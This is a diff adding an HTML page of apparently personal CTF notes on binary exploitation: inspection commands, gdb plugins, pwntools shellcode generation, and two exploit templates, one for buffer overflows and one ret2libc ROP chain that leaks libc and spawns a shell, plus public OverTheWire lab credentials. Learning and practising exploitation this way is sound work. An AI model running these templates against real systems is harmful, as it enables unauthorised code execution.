@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  
+  <link rel="shortcut icon" href="../img/favicon.ico">
+  <title>Binary Exploitation - SH4RKS Notes</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../css/theme.css" />
+  <link rel="stylesheet" href="../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Binary Exploitation";
+    var mkdocs_page_input_path = "bin-exp.md";
+    var mkdocs_page_url = null;
+  </script>
+  
+  <script src="../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href=".." class="icon icon-home"> SH4RKS Notes</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../ad/">Windows Active Directory</a>
+                    </li>
+                </ul>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Binary Exploitation</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#checking-out-the-binary">Checking out the binary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#gdb">GDB</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#gef">Gef</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#pwndbg">Pwndbg</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#pwntools">PWNTOOLS</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#finding-got-plt-and-offset-addresses">Finding GOT, PLT and Offset addresses</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#templates">Templates</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#standard-template">Standard Template</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#rop-template">ROP Template</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="..">SH4RKS Notes</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Binary Exploitation</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h2 id="binary-exploitation">Binary Exploitation</h2>
+<h3 id="checking-out-the-binary">Checking out the binary</h3>
+<pre><code class="language-bash">file &lt;binary&gt;
+checksec &lt;binary&gt;
+readelf -a &lt;binary&gt;
+strings &lt;binary&gt;
+ltrace &lt;binary&gt;
+</code></pre>
+<h3 id="gdb">GDB</h3>
+<h4 id="gef">Gef</h4>
+<p>Find out how to install or use:
+<a href="https://gef.readthedocs.io/en/master/">https://gef.readthedocs.io/en/master/</a></p>
+<pre><code class="language-bash">gdb -q &lt;binary-name&gt;
+
+# main commands in gef to look around the binary
+gef&gt; info functions
+gef&gt; b &lt;function-name&gt; # breakpoint
+gef&gt; disassemble &lt;function-name&gt;  
+</code></pre>
+<h4 id="pwndbg">Pwndbg</h4>
+<p>This has alot more features.</p>
+<p>For example: for <strong>stripped</strong> binaries, pivot to r2</p>
+<pre><code class="language-bash">-&gt; % gdb-pwndbg &lt;binary&gt;                 
+pwndbg: loaded 194 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from &lt;binary&gt;...
+(No debugging symbols found in &lt;binary&gt;)
+Undefined command: &quot;init-pwndbg&quot;.  Try &quot;help&quot;.
+pwndbg&gt; r2
+WARNING: No calling convention defined for this file, analysis may be inaccurate.
+[0x000010b0]&gt; aa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[0x000010b0]&gt; afl
+(snipped)
+0x000011ec    8 308          main
+(snipped)
+[0x000010b0]&gt; s main
+[0x000011ec]&gt; pdf # disassemble
+
+</code></pre>
+<h3 id="pwntools">PWNTOOLS</h3>
+<p><code>pip install pwntools</code></p>
+<pre><code class="language-py"># Debugging
+context.log_level = 'debug'
+
+# Shellcode generate example
+shellcode = asm(shellcraft.sh()) # spawn /bin/bash
+shellcode = asm(shellcraft.popad()) # shellcode pop all regs
+</code></pre>
+<h3 id="finding-got-plt-and-offset-addresses">Finding GOT, PLT and Offset addresses</h3>
+<pre><code class="language-bash">objdump -R &lt;binary&gt; # Finding main and puts_got 
+objdump -d &lt;binary&gt; # Finding puts_plt  
+ROPgadget --binary &lt;binary&gt; | grep &quot;pop rdi ; ret&quot; # To find ROP gadget 
+objdump -d libc.so.6 | grep &quot;puts&quot; # To find puts libc offset
+</code></pre>
+<p>More: To find <strong>gadget_offset</strong>, see <a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
+<h3 id="templates">Templates</h3>
+<h4 id="standard-template">Standard Template</h4>
+<pre><code class="language-py">from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Find offset to EIP/RIP for buffer overflows
+def find_ip(payload):
+    # Launch process and send payload
+    p = process(exe)
+    p.sendlineafter('&gt;', payload)
+    # Wait for the process to crash
+    p.wait()
+    # Print out the address of EIP/RIP at the time of crashing
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+
+# Binary filename
+exe = './vuln'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (warning/info/debug)
+context.log_level = 'info'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Pass in pattern_size, get back EIP/RIP offset
+offset = find_ip(cyclic(100))
+
+# Start program
+io = start()
+
+# Build the payload
+payload = flat({
+    offset: [
+
+    ]
+})
+
+# Save the payload to file
+write('payload', payload)
+
+# Send the payload
+io.sendlineafter('&gt;', payload)
+io.recvuntil('Thank you!\n')
+
+# Got Shell?
+io.interactive()
+
+# Or, Get our flag!
+# flag = io.recv()
+# success(flag)
+</code></pre>
+<h4 id="rop-template">ROP Template</h4>
+<pre><code class="language-py">from pwn import *
+
+####################
+#### CONNECTION ####
+####################
+LOCAL = True
+REMOTETTCP = False
+REMOTESSH = False
+GDB = False
+
+LOCAL_BIN = &quot;./vuln&quot;
+REMOTE_BIN = &quot;~/vuln&quot; #For ssh
+LIBC = &quot;&quot; #ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) #Set library path when know it
+
+if LOCAL:
+    P = process(LOCAL_BIN) # start the vuln binary
+    ELF_LOADED = ELF(LOCAL_BIN) # Extract data from binary
+    ROP_LOADED = ROP(ELF_LOADED) # Find ROP gadgets
+
+elif REMOTETTCP:
+    P = remote('10.10.10.10',1339) # start the vuln binary
+    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
+    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets
+
+elif REMOTESSH:
+    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
+    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
+    elf = ELF(LOCAL_BIN) # Extract data from binary
+    rop = ROP(elf) # Find ROP gadgets
+
+if GDB and not REMOTETTCP and not REMOTESSH:
+    # attach gdb and continue
+    # You can set breakpoints, for example &quot;break *main&quot;
+    gdb.attach(P.pid, &quot;b *main&quot;)
+
+
+
+##########################
+##### OFFSET FINDER ######
+##########################
+
+OFFSET = b&quot;&quot; #b&quot;A&quot;*264
+if OFFSET == b&quot;&quot;:
+    gdb.attach(P.pid, &quot;c&quot;) #Attach and continue
+    payload = cyclic(250)
+    payload += b&quot;AAAAAAAA&quot;
+    print(P.clean())
+    P.sendline(payload)
+    #x/wx $rsp -- Search for bytes that crashed the application
+    #print(cyclic_find(0x63616171)) # Find the offset of those bytes
+    P.interactive()
+    exit()
+
+
+
+#####################
+#### Find Gadgets ###
+#####################
+try:
+    libc_func = &quot;puts&quot;
+    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols[&quot;puts&quot;] # This is also valid to call puts
+except:
+    libc_func = &quot;printf&quot;
+    PUTS_PLT = ELF_LOADED.plt['printf']
+
+MAIN_PLT = ELF_LOADED.symbols['main']
+POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep &quot;pop rdi&quot;
+RET = (ROP_LOADED.find_gadget(['ret']))[0]
+
+log.info(&quot;Main start: &quot; + hex(MAIN_PLT))
+log.info(&quot;Puts plt: &quot; + hex(PUTS_PLT))
+log.info(&quot;pop rdi; ret  gadget: &quot; + hex(POP_RDI))
+log.info(&quot;ret gadget: &quot; + hex(RET))
+
+
+#########################
+#### Find LIBC offset ###
+#########################
+
+def generate_payload_aligned(rop):
+    payload1 = OFFSET + rop
+    if (len(payload1) % 16) == 0:
+        return payload1
+
+    else:
+        payload2 = OFFSET + p64(RET) + rop
+        if (len(payload2) % 16) == 0:
+            log.info(&quot;Payload aligned successfully&quot;)
+            return payload2
+        else:
+            log.warning(f&quot;I couldn't align the payload! Len: {len(payload1)}&quot;)
+            return payload1
+
+
+def get_addr(libc_func):
+    FUNC_GOT = ELF_LOADED.got[libc_func]
+    log.info(libc_func + &quot; GOT @ &quot; + hex(FUNC_GOT))
+    # Create rop chain
+    rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+    rop1 = generate_payload_aligned(rop1)
+
+    # Send our rop-chain payload
+    #P.sendlineafter(&quot;dah?&quot;, rop1) #Use this to send the payload when something is received
+    print(P.clean()) # clean socket buffer (read all and print)
+    P.sendline(rop1)
+
+    # If binary is echoing back the payload, remove that message
+    recieved = P.recvline().strip()
+    if OFFSET[:30] in recieved:
+        recieved = P.recvline().strip()
+
+    # Parse leaked address
+    log.info(f&quot;Len rop1: {len(rop1)}&quot;)
+    leak = u64(recieved.ljust(8, b&quot;\x00&quot;))
+    log.info(f&quot;Leaked LIBC address,  {libc_func}: {hex(leak)}&quot;)
+
+    # Set lib base address
+    if LIBC:
+        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
+        log.info(&quot;LIBC base @ %s&quot; % hex(LIBC.address))
+
+    # If not LIBC yet, stop here
+    else:
+        print(&quot;TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)&quot;)
+        P.interactive()
+
+    return hex(leak)
+
+get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base
+
+
+
+##############################
+##### FINAL EXPLOITATION #####
+##############################
+
+BINSH = next(LIBC.search(b&quot;/bin/sh&quot;)) #Verify with find /bin/sh
+SYSTEM = LIBC.sym[&quot;system&quot;]
+EXIT = LIBC.sym[&quot;exit&quot;]
+
+log.info(&quot;POP_RDI %s &quot; % hex(POP_RDI))
+log.info(&quot;bin/sh %s &quot; % hex(BINSH))
+log.info(&quot;system %s &quot; % hex(SYSTEM))
+log.info(&quot;exit %s &quot; % hex(EXIT))
+
+rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
+rop2 = generate_payload_aligned(rop2)
+
+
+P.clean()
+P.sendline(rop2)
+
+
+P.interactive() #Interact with your shell :)
+</code></pre>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+      
+        <a href="../ad/" class="btn btn-neutral" title="Windows Active Directory"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../ad/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+    </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="../js/theme.js" defer></script>
+      <script src="../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
